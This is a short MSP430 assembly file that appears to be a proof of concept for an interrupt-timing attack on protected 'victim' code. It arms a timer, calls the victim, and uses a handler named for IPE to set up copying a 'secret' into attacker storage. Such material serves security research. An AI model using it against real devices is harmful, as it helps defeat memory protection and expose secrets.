    .global victim
    .global storage
    .global attacker
    .global secret
    .global TA0CTL
    .global TA0CCR0
    .sect ".att_ram_code"
storage:
	.word 0
attacker:
	nop
	eint
	nop

    mov #0x4, &TA0CTL
    mov #0x5, &TA0CCR0
    mov #0x216, &TA0CTL
	call #victim
	reta


isr_ipe:
    mov #0x0, &TA0CTL

	mov #secret, r13
	mov #storage, r14
	mov #0x9, r15

	reti

	.sect ".int44"
iv_45:
	.word isr_ipe
